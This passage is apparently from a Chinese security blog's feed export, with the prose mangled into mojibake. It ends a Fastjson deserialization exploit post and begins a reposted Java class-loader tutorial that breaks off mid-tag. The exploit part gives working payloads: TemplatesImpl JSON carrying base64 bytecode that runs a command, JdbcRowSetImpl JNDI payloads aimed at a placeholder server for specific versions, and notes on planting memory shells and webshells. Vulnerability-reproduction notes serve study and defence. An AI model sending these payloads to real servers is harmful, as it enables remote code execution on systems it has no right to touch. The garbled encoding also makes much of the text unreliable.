è¿›å»çš„å€¼èµ‹ç»™<code>dataSource</code></p><p><code>setautoCommit</code>æ–¹æ³•éœ€è¦ä¼ å…¥ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„å‚æ•°ï¼Œè·Ÿè¿›connectæ–¹æ³•ï¼Œ<code>lookup(getDataSourceName())</code> lookupå‡½æ•°é“¾æ¥æˆ‘ä»¬å†™å…¥çš„æœåŠ¡ åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»</p></blockquote><h3 id="TemplatesImplé“¾"><a href="#TemplatesImplé“¾" class="headerlink" title="TemplatesImplé“¾"></a>TemplatesImplé“¾</h3><blockquote><p>åŠ è½½javaå­—èŠ‚ç å¹¶å®ä¾‹åŒ–ï¼Œå¯ä»¥é€šè¿‡è¯¥é“¾æ³¨å…¥å†…å­˜é©¬</p></blockquote><p>å±€é™æ€§</p><p><img src="/../images/image-20231008151707946.png" alt="image-20231008151707946"></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>&#x27;_name&#x27;<span class="punctuation">:</span>&#x27;exp&#x27;<span class="punctuation">,</span>&#x27;_tfactory&#x27;<span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ç‰ˆæœ¬"><a href="#ç‰ˆæœ¬" class="headerlink" title="ç‰ˆæœ¬"></a>ç‰ˆæœ¬</h3><blockquote><p>Fastjsonåœ¨ä¸åŒç‰ˆæœ¬ä¸‹çš„åˆ©ç”¨æ–¹å¼å¾ˆä¸åŒï¼Œæ‰€ä»¥å­˜åœ¨Fastjsonæ¼æ´æ—¶ï¼Œé¦–è¦åˆ¤æ–­Fastjsonçš„ç‰ˆæœ¬ã€‚</p></blockquote><h4 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx://xxx/xx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-25â€“1-2-47"><a href="#1-2-25â€“1-2-47" class="headerlink" title="1.2.25â€“1.2.47"></a>1.2.25â€“1.2.47</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx://xxx/xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-2-48â€“1-2-68"><a href="#1-2-48â€“1-2-68" class="headerlink" title="1.2.48â€“1.2.68"></a>1.2.48â€“1.2.68</h4><h4 id="1-2-80"><a href="#1-2-80" class="headerlink" title="1.2.80"></a>1.2.80</h4><h1 id="ä¸å‡ºç½‘åˆ©ç”¨"><a href="#ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="ä¸å‡ºç½‘åˆ©ç”¨"></a>ä¸å‡ºç½‘åˆ©ç”¨</h1><ul><li><p>TemplatesImplé“¾æ³¨å…¥å†…å­˜é©¬ï¼ŒTemplatesImplé“¾é™åˆ¶å¤šï¼Œä¸å®¹æ˜“é‡åˆ°</p></li><li><p>Commons-io å†™æ–‡ä»¶&#x2F;webshell  ä½ç‰ˆæœ¬</p><p>é™åˆ¶ï¼šfastjson&lt;1.2.68</p></li><li><p>BECLæ”»å‡»ï¼Œå‘½ä»¤æ‰§è¡Œ&#x2F;å†…å­˜é©¬</p><p>é™åˆ¶ï¼šJava 8u251ä»¥åï¼Œbcelç±»è¢«åˆ é™¤</p></li><li><p>C3P0<strong>ååºåˆ—åŒ–</strong></p></li><li><p>å‘½ä»¤æ‰§è¡Œç»“æœå†™åˆ°é™æ€ç›®å½•ä¸‹</p></li></ul><h1 id="æ¨èé˜…è¯»"><a href="#æ¨èé˜…è¯»" class="headerlink" title="æ¨èé˜…è¯»"></a>æ¨èé˜…è¯»</h1><p><a href="https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA">ç¬¬18ç¯‡ï¼šfastjsonååºåˆ—åŒ–æ¼æ´åŒºåˆ†ç‰ˆæœ¬å·çš„æ–¹æ³•æ€»ç»“ (qq.com)</a></p><p><a href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson: Fastjsonå§¿åŠ¿æŠ€å·§é›†åˆ</a></p><p><a href="https://xz.aliyun.com/t/12492">Fastjsonä¸å‡ºç½‘åˆ©ç”¨æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaç±»åŠ è½½å™¨</title>
      <link href="/2023/05/01/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
      <url>/2023/05/01/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>è½¬è½½è‡ª<a href="https://xz.aliyun.com/t/9002#toc-0">JAVAå®‰å…¨åŸºç¡€ï¼ˆä¸€ï¼‰â€“ç±»åŠ è½½å™¨ï¼ˆClassLoaderï¼‰ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p></blockquote><h2 id="0x01-æ¦‚å¿µ"><a href="#0x01-æ¦‚å¿µ" class="headerlink" title="0x01 æ¦‚å¿µ"></a>0x01 æ¦‚å¿µ</h2><p>Javaç±»åŠ è½½å™¨(Java Classloader)æ˜¯Javaè¿è¡Œæ—¶ç¯å¢ƒ(Java Runtime Environment)çš„ä¸€éƒ¨åˆ†ï¼Œè´Ÿè´£åŠ¨æ€åŠ è½½Javaç±»åˆ°Javaè™šæ‹Ÿæœºçš„å†…å­˜ç©ºé—´ä¸­ï¼Œç”¨äºåŠ è½½ç³»ç»Ÿã€ç½‘ç»œæˆ–è€…å…¶ä»–æ¥æºçš„ç±»æ–‡ä»¶ã€‚Javaæºä»£ç é€šè¿‡javacç¼–è¯‘å™¨ç¼–è¯‘æˆç±»æ–‡ä»¶ï¼Œç„¶åJVMæ¥æ‰§è¡Œç±»æ–‡ä»¶ä¸­çš„å­—èŠ‚ç æ¥æ‰§è¡Œç¨‹åºã€‚</p><h2 id="0x02-Javaç±»è¿è¡Œ"><a href="#0x02-Javaç±»è¿è¡Œ" class="headerlink" title="0x02 Javaç±»è¿è¡Œ"></a>0x02 Javaç±»è¿è¡Œ</h2><p><img src="/../images/EsePjI7n9CtyqbA.png" alt="image-20230502220543579"></p><p>ä¸€åˆ‡çš„Javaç±»éƒ½å¿…é¡»å…ˆè½¬æ¢ä¸ºç±»å­—èŠ‚ç ç„¶åç»è¿‡JVMåŠ è½½åæ‰èƒ½è¿è¡Œï¼Œè€Œ<code>ClassLoader</code>çš„ä¸»è¦ä½œç”¨å°±æ˜¯Javaç±»æ–‡ä»¶ï¼ˆç±»å­—èŠ‚ç ï¼‰çš„åŠ è½½</p><h2 id="0x03-åº”ç”¨åœºæ™¯"><a href="#0x03-åº”ç”¨åœºæ™¯" class="headerlink" title="0x03 åº”ç”¨åœºæ™¯"></a>0x03 åº”ç”¨åœºæ™¯</h2><h3 id="1ã€èµ„æºéš”ç¦»"><a href="#1ã€èµ„æºéš”ç¦»" class="headerlink" title="1ã€èµ„æºéš”ç¦»"></a>1ã€èµ„æºéš”ç¦»</h3><p>å®ç°ä¸åŒé¡¹ç›®æˆ–è€…åŒä¸€ä¸ªé¡¹ç›®ä¸Šçš„ä¸åŒç‰ˆæœ¬çš„jaråŒ…éš”ç¦»ï¼Œé¿å…é›†ç¾¤é”™è¯¯æˆ–è€…å†²çªçš„äº§ç”Ÿã€‚</p><h3 id="2ã€çƒ­éƒ¨ç½²"><a href="#2ã€çƒ­éƒ¨ç½²" class="headerlink" title="2ã€çƒ­éƒ¨ç½²"></a>2ã€çƒ­éƒ¨ç½²</h3><p>å¯¹äºJavaåº”ç”¨ç¨‹åºæ¥è¯´ï¼Œçƒ­éƒ¨ç½²å°±æ˜¯åœ¨è¿è¡Œæ—¶æ›´æ–°Javaç±»æ–‡ä»¶ã€‚åœ¨åŸºäºJavaçš„åº”ç”¨æœåŠ¡å™¨å®ç°çƒ­éƒ¨ç½²çš„è¿‡ç¨‹ä¸­ï¼Œç±»è£…å…¥å™¨æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ã€‚ç±»è£…å…¥å™¨ä¸èƒ½é‡æ–°è£…å…¥ä¸€ä¸ªå·²ç»è£…å…¥çš„ç±»ï¼Œä½†åªè¦ä½¿ç”¨ä¸€ä¸ªæ–°çš„ç±»è£…å…¥å™¨å®ä¾‹ï¼Œå°±å¯ä»¥å°†ç±»å†æ¬¡è£…å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚è¿™æ ·æˆ‘ä»¬åº”ç”¨æ­£åœ¨è¿è¡Œçš„æ—¶å€™å‡çº§è½¯ä»¶ï¼Œå´ä¸éœ€è¦é‡æ–°å¯åŠ¨åº”ç”¨ã€‚</p><h3 id="3ã€ä»£ç ä¿æŠ¤"><a href="#3ã€ä»£ç ä¿æŠ¤" class="headerlink" title="3ã€ä»£ç ä¿æŠ¤"></a>3ã€ä»£ç ä¿æŠ¤</h3><p>æˆ‘ä»¬å¯ä»¥å¯¹å­—èŠ‚ç æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå†ä½¿ç”¨ç‰¹å®šçš„ClassLoaderè§£å¯†æ–‡ä»¶å†…å®¹ï¼Œå†åŠ è½½è¿™äº›å­—èŠ‚ç æ–‡ä»¶ã€‚è¿™æ ·å°±èƒ½å¤Ÿå®ç°å¯¹æˆ‘ä»¬çš„ä»£ç é¡¹ç›®åŠ å¯†ä¿æŠ¤ï¼Œåˆ«äººæ— æ³•è¿›è¡Œåç¼–è¯‘æŸ¥çœ‹æºä»£ç ä¿¡æ¯ã€‚</p><h2 id="0x04-åŒäº²å§”æ´¾"><a href="#0x04-åŒäº²å§”æ´¾" class="headerlink" title="0x04 åŒäº²å§”æ´¾"></a>0x04 åŒäº²å§”æ´¾</h2><ul><li><p>Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰</p><blockquote><p>å¼•å¯¼ç±»åŠ è½½å™¨(BootstrapClassLoader)ï¼Œåº•å±‚åŸç”Ÿä»£ç æ˜¯C++è¯­è¨€ç¼–å†™ï¼Œå±äºjvmä¸€éƒ¨åˆ†ï¼Œä¸ç»§æ‰¿java.lang.ClassLoaderç±»ï¼Œä¹Ÿæ²¡æœ‰çˆ¶åŠ è½½å™¨ï¼Œä¸»è¦è´Ÿè´£åŠ è½½æ ¸å¿ƒjavaåº“(å³JVMæœ¬èº«)ï¼Œå­˜å‚¨åœ¨&#x2F;jre&#x2F;lib&#x2F;rt.jarç›®å½•å½“ä¸­</p></blockquote></li><li><p>Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰</p><blockquote><p>æ‰©å±•ç±»åŠ è½½å™¨(ExtensionsClassLoader)ç”¨æ¥åœ¨&#x2F;jre&#x2F;lib&#x2F;extæˆ–è€…java.ext.dirsä¸­æŒ‡æ˜çš„ç›®å½•åŠ è½½javaçš„æ‰©å±•åº“ã€‚Javaè™šæ‹Ÿæœºä¼šæä¾›ä¸€ä¸ªæ‰©å±•åº“ç›®å½•ï¼Œæ­¤åŠ è½½å™¨åœ¨ç›®å½•é‡Œé¢æŸ¥æ‰¾å¹¶åŠ è½½javaç±»ã€‚</p></blockquote></li><li><p>App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰</p><blockquote><p>ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆApp ClassLoaderï¼‰ä¸€èˆ¬é€šè¿‡é€šè¿‡(java.class.pathæˆ–è€…Classpathç¯å¢ƒå˜é‡)æ¥åŠ è½½Javaç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„classpathè·¯å¾„ã€‚</p><p><code>AppClassLoader</code>æ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨<code>AppClassLoader</code>åŠ è½½</p></blockquote></li></ul><p>è·å¾—ç±»å¯¹è±¡çš„ç±»åŠ è½½å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xxx.class.getClassLoader()</span><br></pre></td></tr></table></figure><p><img src="/../images/20210108151613-642298d0-5181-1.png" alt="20210108151613-642298d0-5181-1"></p><p>å¦‚ä¸Šå›¾ç±»åŠ è½½å™¨å±‚æ¬¡å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ç§°ä¸ºç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æ¨¡å‹ã€‚ä½†æ³¨æ„çš„æ˜¯ï¼Œä»–ä»¬ä¹‹é—´å¹¶ä¸æ˜¯â€ç»§æ‰¿â€ä½“ç³»ï¼Œè€Œæ˜¯å§”æ´¾ä½“ç³»ã€‚å½“ä¸Šè¿°ç‰¹å®šçš„ç±»åŠ è½½å™¨æ¥åˆ°åŠ è½½ç±»çš„è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šå…ˆå°†ä»»åŠ¡å§”æ‰˜ç»™çˆ¶ç±»åŠ è½½å™¨ï¼Œæ¥ç€è¯·æ±‚çˆ¶ç±»åŠ è½½è¿™ä¸ªç±»ï¼Œå½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½æ—¶ï¼ˆå…¶ç›®å½•æœç´ èŒƒå›´æ²¡æœ‰æ‰¾åˆ°æ‰€éœ€è¦çš„ç±»æ—¶ï¼‰ï¼Œå­ç±»åŠ è½½å™¨æ‰ä¼šè¿›è¡ŒåŠ è½½ä½¿ç”¨ã€‚è¿™æ ·å¯ä»¥é¿å…æœ‰äº›ç±»è¢«é‡å¤åŠ è½½ã€‚</p><blockquote><h3 id="åŒäº²å§”æ´¾å¥½å¤„"><a href="#åŒäº²å§”æ´¾å¥½å¤„" class="headerlink" title="åŒäº²å§”æ´¾å¥½å¤„"></a>åŒäº²å§”æ´¾å¥½å¤„</h3><p>1ã€è¿™æ ·å°±æ˜¯èƒ½å¤Ÿå®ç°æœ‰äº›ç±»é¿å…é‡å¤åŠ è½½ä½¿ç”¨ï¼Œç›´æ¥å…ˆç»™çˆ¶åŠ è½½å™¨åŠ è½½ï¼Œä¸ç”¨å­åŠ è½½å™¨å†æ¬¡é‡å¤åŠ è½½ã€‚</p><p>2ã€ä¿è¯javaæ ¸å¿ƒåº“çš„ç±»å‹å®‰å…¨ã€‚æ¯”å¦‚ç½‘ç»œä¸Šä¼ è¾“äº†ä¸€ä¸ªjava.lang.Objectç±»ï¼Œé€šè¿‡åŒäº²æ¨¡å¼ä¼ é€’åˆ°å¯åŠ¨ç±»å½“ä¸­ï¼Œç„¶åå‘ç°å…¶Objectç±»æ—©å·²è¢«åŠ è½½è¿‡ï¼Œæ‰€ä»¥å°±ä¸ä¼šåŠ è½½è¿™ä¸ªç½‘ç»œä¼ è¾“è¿‡æ¥çš„java.lang.Objectç±»</p></blockquote><h2 id="CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•"><a href="#CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•" class="headerlink" title="CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•"></a>CLassLoaderç±»æ ¸å¿ƒæ–¹æ³•</h2><p>é™¤äº†ä¸Šè¿°BootstrapClassLoaderï¼Œå…¶ä»–ç±»åŠ è½½å™¨éƒ½æ˜¯ç»§æ‰¿äº†CLassLoaderç±»ï¼Œæˆ‘ä»¬å°±ä¸€èµ·çœ‹çœ‹å…¶ç±»çš„æ ¸å¿ƒæ–¹æ³•ã€‚ä»¥ä¸‹ä»£ç éƒ½æ˜¯æˆªå–äº†å…¶æ–¹æ³•çš„æºç ã€‚</p><h3 id="1ã€loadClass"><a href="#1ã€loadClass" class="headerlink" title="1ã€loadClass"></a>1ã€loadClass</h3><p><strong>åŠ è½½æŒ‡å®šçš„javaç±»</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>åœ¨loadClassæ–¹æ³•ä¸­ï¼Œå®ƒå…ˆä½¿ç”¨äº†findLoadedClass(String)æ–¹æ³•æ¥æ£€æŸ¥è¿™ä¸ªç±»æ˜¯å¦è¢«åŠ è½½è¿‡ã€‚</p><p>æ¥ç€ä½¿ç”¨çˆ¶åŠ è½½å™¨è°ƒç”¨loadClassï¼ˆStringï¼‰æ–¹æ³•ï¼Œå¦‚æœçˆ¶åŠ è½½å™¨ä¸ºnullï¼Œç±»åŠ è½½å™¨åŠ è½½jvmå†…ç½®çš„åŠ è½½å™¨ã€‚</p><p>ä¹‹åå°±è°ƒç”¨findClass(String) æ–¹æ³•è£…è½½ç±»ã€‚</p><p>æœ€åé€šè¿‡ä¸Šè¿°æ­¥éª¤æˆ‘ä»¬æ‰¾åˆ°äº†å¯¹åº”çš„ç±»ï¼Œå¹¶ä¸”æ¥æ”¶åˆ°çš„resolveå‚æ•°çš„å€¼ä¸ºtrue,é‚£ä¹ˆå°±ä¼šè°ƒç”¨resolveClass(Class)æ–¹æ³•æ¥å¤„ç†ç±»ã€‚</p><h3 id="2ã€findCLass"><a href="#2ã€findCLass" class="headerlink" title="2ã€findCLass"></a>2ã€findCLass</h3><p><strong>æŸ¥æ‰¾æŒ‡å®šçš„Javaç±»</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="3ã€findLoadedClass"><a href="#3ã€findLoadedClass" class="headerlink" title="3ã€findLoadedClass"></a>3ã€findLoadedClass</h3><p><strong>æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±»</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; findLoadedClass(String name) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> findLoadedClass0(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4ã€defineClass"><a href="#4ã€defineClass" class="headerlink" title="4ã€defineClass"></a>4ã€defineClass</h3><p><strong>å®šä¹‰ä¸€ä¸ªJavaç±»ï¼Œå°†å­—èŠ‚ç è§£ææˆè™šæ‹Ÿæœºè¯†åˆ«çš„Classå¯¹è±¡ï¼ˆå°±æ˜¯åœ¨JVMä¸­æ³¨å†Œè¯¥ç±»ï¼‰ã€‚å¾€å¾€å’ŒfindClass()æ–¹æ³•é…åˆä½¿ç”¨ã€‚</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, off, len, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="5ã€resolveClass"><a href="#5ã€resolveClass" class="headerlink" title="5ã€resolveClass"></a>5ã€resolveClass</h3><p><strong>é“¾æ¥æŒ‡å®šJavaç±»</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> &#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">resolveClass0</span><span class="params">(Class c)</span>;</span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹"><a href="#è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹" class="headerlink" title="è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹"></a>è‡ªå®šä¹‰ç±»åŠ è½½å™¨è¿‡ç¨‹</h2><p>å› ä¸ºåœ¨å®é™…åº”ç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…ä»…åªå¸Œæœ›ä½¿ç”¨classpathå½“ä¸­æŒ‡å®šçš„ç±»æˆ–è€…jaråŒ…è¿›è¡Œè°ƒç”¨ä½¿ç”¨ï¼Œæˆ‘ä»¬æœ‰æ—¶å¸Œæœ›è°ƒç”¨æœ¬åœ°ç£ç›˜æ–‡ä»¶æˆ–è€…ç½‘ç»œè¿˜å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨çš„æ–¹å¼ã€‚</p><p>åœ¨ä¸Šé¢loadClassæ–¹æ³•åˆ†æä¸­ï¼Œä»–å†…éƒ¨å…¶å®æ˜¯è°ƒç”¨findClass(String) æ–¹æ³•æ¥è£…è½½ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æƒ³åŠ è½½è‡ªå·±è‡ªå®šä¹‰çš„ç±»ï¼Œå°±æ˜¯è¦†ç›–è¿™ä¸ªfindClass(String) æ–¹æ³•ï¼Œè€Œä¸æ˜¯loadClassæ–¹æ³•ã€‚</p><p>ä»¥ä¸‹å°±æ˜¯è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ­¥éª¤ï¼š</p><p>1ã€ç»§æ‰¿ClassLoaderç±»</p><p>2ã€è¦†ç›–findClass()æ–¹æ³•</p><p>3ã€åœ¨findClass()æ–¹æ³•ä¸­è°ƒç”¨defineClass()æ–¹æ³•</p><p>è¿™é‡Œæˆ‘ä»¬å€ŸåŠ©ä¸€ä¸ªåŠ å¯†javaç±»å­—èŠ‚ç ä¾‹å­æ¥è®²è§£ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªCypherTest.javaæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨java -d . CypherTest.javaï¼Œç„¶åå°±èƒ½ç”ŸæˆCypherTest.classæ–‡ä»¶äº†ã€‚</p><p>CypherTest.javaæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CypherTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This experiment test is successful&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®å½•ä¸‹ç”Ÿæˆäº†CypherTest.classæ–‡ä»¶ã€‚</p><p><img src="E:/blog/source/images/20210108153058-73a8d0f6-5183-1.png" 